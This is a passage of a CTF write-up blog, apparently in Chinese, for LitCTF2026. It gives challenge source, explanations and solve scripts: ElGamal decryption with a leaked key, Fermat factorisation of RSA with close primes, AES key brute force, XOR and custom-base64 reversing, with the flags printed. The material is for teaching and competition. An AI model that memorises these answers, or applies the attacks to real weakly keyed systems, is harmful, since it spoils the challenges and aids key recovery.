class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">LitCTF2026 — ElGamal handshake (story)</span></span><br><span class="line"><span class="string">Someone left debug logging on; the private exponent x was printed alongside ciphertext.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime, getRandomRange</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"><span class="keyword">except</span> ImportError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(<span class="string">&quot;secret.py (FLAG) is required to encrypt.&quot;</span>) <span class="keyword">from</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_elgamal_keypair</span>(<span class="params">bits: <span class="built_in">int</span> = <span class="number">512</span></span>) -&gt; <span class="built_in">tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>]:</span><br><span class="line">    p = getPrime(bits)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        g = getRandomRange(<span class="number">2</span>, <span class="built_in">min</span>(<span class="number">6</span>, p - <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(g, (p - <span class="number">1</span>) // <span class="number">2</span>, p) != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;could not find suitable g&quot;</span>)</span><br><span class="line">    x = randrange(<span class="number">2</span>, p - <span class="number">1</span>)</span><br><span class="line">    y = <span class="built_in">pow</span>(g, x, p)</span><br><span class="line">    <span class="keyword">return</span> p, g, y, x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;--write&quot;</span>,</span><br><span class="line">        <span class="built_in">type</span>=Path,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;Write captured output to this file (for organizers).&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    p, g, y, x = generate_elgamal_keypair(bits=<span class="number">512</span>)</span><br><span class="line">    k = randrange(<span class="number">1</span>, p - <span class="number">2</span>)</span><br><span class="line">    m = bytes_to_long(FLAG)</span><br><span class="line">    <span class="keyword">if</span> m &gt;= p:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;flag too large for chosen p — shorten FLAG&quot;</span>)</span><br><span class="line"></span><br><span class="line">    c1 = <span class="built_in">pow</span>(g, k, p)</span><br><span class="line">    c2 = (m * <span class="built_in">pow</span>(y, k, p)) % p</span><br><span class="line"></span><br><span class="line">    lines = [</span><br><span class="line">        <span class="string">&quot;=== Public key (p, g, y) ===&quot;</span>,</span><br><span class="line">        <span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">f&quot;g = <span class="subst">&#123;g&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">f&quot;y = <span class="subst">&#123;y&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;=== Ciphertext (c1, c2) ===&quot;</span>,</span><br><span class="line">        <span class="string">f&quot;c1 = <span class="subst">&#123;c1&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">f&quot;c2 = <span class="subst">&#123;c2&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;# [DEBUG] prod accidentally logged the long-term secret:&quot;</span>,</span><br><span class="line">        <span class="string">f&quot;x = <span class="subst">&#123;x&#125;</span>&quot;</span>,</span><br><span class="line">    ]</span><br><span class="line">    text = <span class="string">&quot;\n&quot;</span>.join(lines) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(text, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> args.write:</span><br><span class="line">        args.write.write_text(text, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="comment"># === Public key (p, g, y) ===</span></span><br><span class="line"><span class="comment"># p = 9000784855376359808051354825193962042770028561343848432778443672755982397391267124312572697249531643069409873722736348916207732622884411596948807031140651</span></span><br><span class="line"><span class="comment"># g = 3</span></span><br><span class="line"><span class="comment"># y = 269130883529708333054320571854006406481346665463416017026083074488011546059928157925990665431751017523964760326934454181952822744463714981243407307134357</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># === Ciphertext (c1, c2) ===</span></span><br><span class="line"><span class="comment"># c1 = 5245857426274383693193378669425243235151460522527004924092730024427525619244222247576829782077334810173274945751493387545849499010408499951268967774043627</span></span><br><span class="line"><span class="comment"># c2 = 6059939492718262451327758167005534191200936922719178843825888167191062504030471358635203794720371216217447404436172970111033824674731063386612549785069654</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # [DEBUG] prod accidentally logged the long-term secret:</span></span><br><span class="line"><span class="comment"># x = 633366293219022684108628483753423657477324253833657141033762971761747669344649667887002347907882241246119223126492863291886751205505360049793728851371884</span></span><br></pre></td></tr></table></figure></div>
+
+<p>ElGamal 加密：</p>
+<ul>
+<li>公钥：(p,g,y)(p,g,y)(p,g,y)，其中 <img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251312717.png"
+                      alt="img"
+                ></li>
+<li>私钥：x</li>
+</ul>
+<p>密文：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251312428.png"
+                      alt="img"
+                ></p>
+<p>因为题目直接泄露了私钥 x，所以：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251312072.png"
+                      alt="img"
+                ></p>
+<p>于是：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251312683.png"
+                      alt="img"
+                ></p>
+<p>核心公式：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251312348.png"
+                      alt="img"
+                ></p>
+<p>直接写脚本即可。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">p = <span class="number">9000784855376359808051354825193962042770028561343848432778443672755982397391267124312572697249531643069409873722736348916207732622884411596948807031140651</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="number">5245857426274383693193378669425243235151460522527004924092730024427525619244222247576829782077334810173274945751493387545849499010408499951268967774043627</span></span><br><span class="line"></span><br><span class="line">c2 = <span class="number">6059939492718262451327758167005534191200936922719178843825888167191062504030471358635203794720371216217447404436172970111033824674731063386612549785069654</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">633366293219022684108628483753423657477324253833657141033762971761747669344649667887002347907882241246119223126492863291886751205505360049793728851371884</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = y^k = c1^x mod p</span></span><br><span class="line">s = <span class="built_in">pow</span>(c1, x, p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># s^&#123;-1&#125; mod p</span></span><br><span class="line">s_inv = <span class="built_in">pow</span>(s, -<span class="number">1</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recover plaintext integer</span></span><br><span class="line">m = (c2 * s_inv) % p</span><br><span class="line"></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251312699.png"
+                      alt="img"
+                ></p>
+<h2 id="LitCTF2026-lit-rsa-neighbor"><a href="#LitCTF2026-lit-rsa-neighbor" class="headerlink" title="[LitCTF2026] lit_rsa_neighbor"></a>[LitCTF2026] lit_rsa_neighbor</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">LitCTF2026 — RSA where q is &#x27;far&#x27; along the prime line but still close enough to p for Fermat.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> secret <span class="keyword">import</span> FLAG, NEXT_PRIME_STEPS</span><br><span class="line"><span class="keyword">except</span> ImportError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(</span><br><span class="line">        <span class="string">&quot;secret.py is required to generate output (FLAG, NEXT_PRIME_STEPS).&quot;</span></span><br><span class="line">    ) <span class="keyword">from</span> e</span><br><span class="line"></span><br><span class="line">E = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;--write&quot;</span>,</span><br><span class="line">        <span class="built_in">type</span>=Path,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;Write n, c to this file.&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = p</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(NEXT_PRIME_STEPS):</span><br><span class="line">        q = <span class="built_in">int</span>(gmpy2.next_prime(q))</span><br><span class="line"></span><br><span class="line">    n = p * q</span><br><span class="line">    m = bytes_to_long(FLAG)</span><br><span class="line">    <span class="keyword">if</span> m &gt;= n:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;flag too large for n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    c = <span class="built_in">pow</span>(m, E, n)</span><br><span class="line"></span><br><span class="line">    lines_players = [<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>, <span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>, <span class="string">f&quot;e = <span class="subst">&#123;E&#125;</span>&quot;</span>]</span><br><span class="line">    text = <span class="string">&quot;\n&quot;</span>.join(lines_players) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(text, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> args.write:</span><br><span class="line">        args.write.write_text(text, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 139637440016232025690294457609899605991056011052010466558411851317943636600860419882966079629826706361935550982744312593243181819999590825159611186779613601241742349986440676188542381451066058816661317621009248513651083772907520139375108426466691332559612971244160246310746215067136490772061317571744230078911</span></span><br><span class="line"><span class="comment"># c = 81172369642931859390486697024961350889751244109623802937988620847486863147682579984823958801948701482096140632580173113959531836503723522945335985723867818778699337807630592078265626995722998378992215523352858561923474395550395284015986525513984910021995657780411466237306614109262460764382539311725297619429</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br></pre></td></tr></table></figure></div>
+
+<p>是一个典型的 Fermat 分解攻击。</p>
+<p>因为：</p>
+<ul>
+<li><code>q</code> 不是随机独立生成 </li>
+<li>而是从 <code>p</code> 连续 next_prime 得到 </li>
+<li>所以 <code>p ≈ q</code></li>
+<li>当两个素数很接近时，RSA 模数可以被费马分解快速破解</li>
+</ul>
+<p>对于</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251313878.png"
+                      alt="img"
+                ></p>
+<p> 如果 p,qp,qp,q 很接近：  </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251313299.png"
+                      alt="img"
+                ></p>
+<p>令:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251313215.png"
+                      alt="img"
+                ></p>
+<p> 不断尝试：  </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251313222.png"
+                      alt="img"
+                ></p>
+<p> 直到 b^2 是完全平方数：  </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251313172.png"
+                      alt="img"
+                ></p>
+<p>exp</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"></span><br><span class="line">n = <span class="number">139637440016232025690294457609899605991056011052010466558411851317943636600860419882966079629826706361935550982744312593243181819999590825159611186779613601241742349986440676188542381451066058816661317621009248513651083772907520139375108426466691332559612971244160246310746215067136490772061317571744230078911</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">81172369642931859390486697024961350889751244109623802937988620847486863147682579984823958801948701482096140632580173113959531836503723522945335985723867818778699337807630592078265626995722998378992215523352858561923474395550395284015986525513984910021995657780411466237306614109262460764382539311725297619429</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Fermat Factorization</span></span><br><span class="line">a = isqrt(n)</span><br><span class="line"><span class="keyword">if</span> a * a &lt; n:</span><br><span class="line">    a += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    b2 = a*a - n</span><br><span class="line">    b = isqrt(b2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> b*b == b2:</span><br><span class="line">        p = a - b</span><br><span class="line">        q = a + b</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    a += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] p =&quot;</span>, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] q =&quot;</span>, q)</span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251313894.png"
+                      alt="img"
+                ></p>
+<h2 id="LitCTF2026-lit-tiny-key-aes"><a href="#LitCTF2026-lit-tiny-key-aes" class="headerlink" title="[LitCTF2026] lit_tiny_key_aes"></a>[LitCTF2026] lit_tiny_key_aes</h2><p>exp</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line">KEY_PREFIX = <span class="string">b&quot;LitCTF2026!!!&quot;</span></span><br><span class="line"></span><br><span class="line">c = <span class="string">b&quot;\x0c\xdb&#x27;`\xc91\xf7\x05\x91+\x0fM\xed\xbc\x9b\xf1\xd8D\xcd\xfd\x0c\xb9\xb6\xb2J&lt;\x86\x19\x06K\xb3\xa2\xa4\x18\x87&lt;v\xac\x1bbu#\xaa\xb5I\x7f\xd8\xd3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_likely_flag</span>(<span class="params">pt: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        pt.startswith(<span class="string">b&quot;litctf&#123;&quot;</span>)</span><br><span class="line">        <span class="keyword">or</span> pt.startswith(<span class="string">b&quot;LitCTF&#123;&quot;</span>)</span><br><span class="line">        <span class="keyword">or</span> pt.startswith(<span class="string">b&quot;flag&#123;&quot;</span>)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span> ** <span class="number">3</span>):</span><br><span class="line">    suffix = i.to_bytes(<span class="number">3</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    key = KEY_PREFIX + suffix</span><br><span class="line"></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 先只解第一块，提高筛选速度</span></span><br><span class="line">    first_block = cipher.decrypt(c[:<span class="number">16</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_likely_flag(first_block):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 命中疑似 flag 后，再解完整密文</span></span><br><span class="line">    pt_padded = cipher.decrypt(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pt = unpad(pt_padded, AES.block_size)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Found key:&quot;</span>, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Unknown suffix:&quot;</span>, suffix.<span class="built_in">hex</span>())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Plaintext:&quot;</span>, pt.decode())</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>
+
+<p>题目使用的是 AES-128-ECB：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AES.new(key, AES.MODE_ECB)</span><br></pre></td></tr></table></figure></div>
+
+<p>AES-128 的密钥长度是 16 字节。题目中固定了前 13 字节：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KEY_PREFIX = <span class="string">b&quot;LitCTF2026!!!&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>剩下只有 3 字节未知：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">16 - 13 = 3</span><br></pre></td></tr></table></figure></div>
+
+<p>每个字节有 256 种可能，所以总共只有：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">256 * 256 * 256 = 16777216</span><br></pre></td></tr></table></figure></div>
+
+<p>这个规模对于离线爆破来说非常小。</p>
+<p>因为 ECB 模式不需要 IV，所以只要枚举出正确 key，就可以直接解密密文。密文长度是 48 字节，也就是 3 个 AES block：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">48 / 16 = 3</span><br></pre></td></tr></table></figure></div>
+
+<p>明文使用了 PKCS#7 padding，所以解密后还需要：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unpad(pt_padded, AES.block_size)</span><br></pre></td></tr></table></figure></div>
+
+<p>爆破时可以先只解密第一块：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">first_block = cipher.decrypt(c[:<span class="number">16</span>])</span><br></pre></td></tr></table></figure></div>
+
+<p>正确 key 解出来的第一块是：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">litctf&#123;aes_tiny_</span><br></pre></td></tr></table></figure></div>
+
+<p>所以可以用 flag 前缀快速筛选。找到正确后，再解完整密文，去掉 padding，得到：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">litctf&#123;aes_tiny_brut3_for_the_win!&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251313562.png"
+                      alt="img"
+                ></p>
+<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="LitCTF2026-lit-xor-chain"><a href="#LitCTF2026-lit-xor-chain" class="headerlink" title="[LitCTF2026] lit_xor_chain"></a>[LitCTF2026] lit_xor_chain</h2><p> 用户输入flag，每个字符先异或0x52，再加5，与全局数组g_expected比较  相等则返回”Good!”。</p>
+<p>g_expected数组内容已知，写脚本解密得到flag：LitCTF{rev01_xor_then_add_ok!}</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">g_expected = [</span><br><span class="line">    <span class="number">0x23</span>, <span class="number">0x40</span>, <span class="number">0x2B</span>, <span class="number">0x16</span>, <span class="number">0x0B</span>, <span class="number">0x19</span>, <span class="number">0x2E</span>, <span class="number">0x25</span>, <span class="number">0x3C</span>, <span class="number">0x29</span>,</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x12</span>, <span class="number">0x2F</span>, <span class="number">0x42</span>, <span class="number">0x25</span>, <span class="number">0x12</span>, <span class="number">0x2B</span>, <span class="number">0x3F</span>, <span class="number">0x3C</span>,</span><br><span class="line">    <span class="number">0x41</span>, <span class="number">0x12</span>, <span class="number">0x38</span>, <span class="number">0x3B</span>, <span class="number">0x3B</span>, <span class="number">0x12</span>, <span class="number">0x42</span>, <span class="number">0x3E</span>, <span class="number">0x78</span>, <span class="number">0x34</span></span><br><span class="line">]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x in g_expected:</span><br><span class="line">    ch = ((x - <span class="number">5</span>) ^ <span class="number">0x52</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    flag += chr(ch)</span><br><span class="line">print(<span class="string">&quot;flag =&quot;</span>, flag)</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="LitCTF2026-lit-b64-alphabet"><a href="#LitCTF2026-lit-b64-alphabet" class="headerlink" title="[LitCTF2026] lit_b64_alphabet"></a>[LitCTF2026] lit_b64_alphabet</h2><p>base64换表，索引表被换成了’2KuEphj84USZF67iloxzfYd+MrDgRG9yLwBnHAXcJq3eCN&#x2F;s1bOQ5TvPa0tVkWmI’，密文也已给出，写脚本解密得到：LitCTF{rev02_custom_b64_table!}</p>
